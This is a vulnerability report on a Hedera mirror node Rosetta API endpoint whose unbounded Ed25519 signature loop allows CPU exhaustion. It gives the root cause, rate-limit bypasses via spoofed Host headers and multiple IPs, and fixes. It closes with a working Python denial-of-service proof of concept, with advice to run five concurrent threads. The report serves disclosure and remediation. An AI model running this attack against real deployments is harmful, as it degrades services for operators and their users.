### Title
Unbounded Signature Verification Loop in `ConstructionCombine` Enables CPU Exhaustion

### Summary
The `ConstructionCombine` endpoint in `rosetta/app/services/construction_service.go` iterates over an attacker-controlled `request.Signatures` slice with no upper bound, calling `ed25519.Verify()` for every entry. Because the verification only checks that each signature is cryptographically valid for its accompanying public key (not that the key is authorized), an unprivileged attacker can pre-generate thousands of their own Ed25519 key pairs, sign the frozen transaction body bytes offline, and submit all pairs in a single request, forcing the server to perform an unbounded number of expensive cryptographic operations.

### Finding Description
**Exact code path:**

`rosetta/app/services/construction_service.go`, function `ConstructionCombine`, lines 58–87.

```
Line 58:  if len(request.Signatures) == 0 { return nil, errors.ErrNoSignature }
Line 72:  for _, signature := range request.Signatures {
Line 73:      if signature.SignatureType != rTypes.Ed25519 { return nil, ... }
Line 77:      pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
Line 82:      if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {
Line 83:          return nil, errors.ErrInvalidSignatureVerification
Line 84:      }
Line 86:      _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
```

**Root cause:** The only guard on `request.Signatures` is the `len == 0` check at line 58. There is no maximum length check. The loop at line 72 calls `hiero.PublicKeyFromBytes`, `ed25519.Verify`, and `hiero.TransactionAddSignature` for every element.

**Failed assumption:** The code assumes callers will supply only the small number of signatures actually required to authorize a transaction. It does not account for an adversary who deliberately inflates the slice.

**Why the early-exit does not help:** The loop exits early only on an *invalid* signature (line 82–84). An attacker bypasses this by generating N Ed25519 key pairs entirely offline, signing the `frozenBodyBytes` with each private key, and submitting all N `(pubKey, validSignature)` pairs. Every call to `ed25519.Verify` returns `true`, so the loop runs to completion across all N entries.

**Why the Traefik middleware is insufficient:**
- The `inFlightReq` limit (`amount: 5`) is per source IP, but the `rateLimit` (`average: 10`) is keyed on `requestHost` (the HTTP `Host` header), not the source IP. An attacker using multiple IPs or spoofed `Host` headers bypasses the rate limit entirely.
- Both controls are optional Kubernetes/Helm chart infrastructure (`charts/hedera-mirror-rosetta/values.yaml` lines 152–160). Deployments without Traefik have no protection at all.
- Neither control bounds the *payload size* or the *number of signatures per request*.

### Impact Explanation
Each `ed25519.Verify` call takes approximately 50–100 µs on modern hardware. A single request carrying 10,000 valid signatures consumes 500 ms–1 s of CPU. With the Traefik `inFlightReq` limit of 5 concurrent requests, an attacker sustains 2.5–5 CPU-seconds of work per wall-clock second, saturating one or more cores. This far exceeds the 30% resource-consumption threshold. The mirror node's ability to serve other Rosetta endpoints (block queries, account lookups) degrades proportionally, constituting a denial-of-service against the mirror node's Rosetta API.

### Likelihood Explanation
The attack requires no credentials, no on-chain account, and no prior interaction with the network. Key-pair generation and offline signing are trivially cheap. A single attacker with a commodity machine and a basic HTTP client can sustain the attack indefinitely. The endpoint is publicly reachable on any deployment that exposes the Rosetta API. Repeatability is unlimited.

### Recommendation
1. **Enforce a hard upper bound on `len(request.Signatures)`** at the application level, before the loop. A reasonable maximum is the number of signers the underlying transaction type can have (e.g., 2 for a `TransferTransaction`). Reject requests exceeding this limit with an appropriate error.
2. **Enforce a maximum request body size** at the HTTP server or middleware layer to prevent large payloads from reaching the handler.
3. **Key the Traefik `rateLimit` on source IP** (`ipStrategy`) rather than `requestHost` to prevent trivial bypass via `Host` header manipulation.

### Proof of Concept
```python
import ed25519  # pip install ed25519
import requests, json, binascii

# 1. Obtain or craft a valid frozen TransferTransaction hex string (unsigned_transaction).
#    This can be obtained from /construction/payloads or crafted manually.
unsigned_tx_hex = "<valid_frozen_transfer_transaction_hex>"

# 2. Derive frozenBodyBytes from the transaction (same bytes the server computes).
#    For PoC purposes, use the signing_payload bytes returned by /construction/payloads.
frozen_body_bytes = bytes.fromhex("<frozen_body_bytes_hex>")

# 3. Generate N key pairs and sign the body bytes with each.
N = 10000
signatures = []
for _ in range(N):
    signing_key, verifying_key = ed25519.create_keypair()
    sig = signing_key.sign(frozen_body_bytes)
    signatures.append({
        "signing_payload": {
            "hex_bytes": frozen_body_bytes.hex(),
            "signature_type": "ed25519"
        },
        "public_key": {
            "hex_bytes": verifying_key.to_bytes().hex(),
            "curve_type": "edwards25519"
        },
        "signature_type": "ed25519",
        "hex_bytes": sig.hex()
    })

# 4. Send the single request with N valid signatures.
payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "unsigned_transaction": unsigned_tx_hex,
    "signatures": signatures
}
resp = requests.post("http://<rosetta-host>/construction/combine", json=payload)
# Server performs 10,000 ed25519.Verify calls before responding.
print(resp.status_code, resp.elapsed.total_seconds())
```

Repeat with 5 concurrent threads to saturate the `inFlightReq` limit and maximize CPU consumption.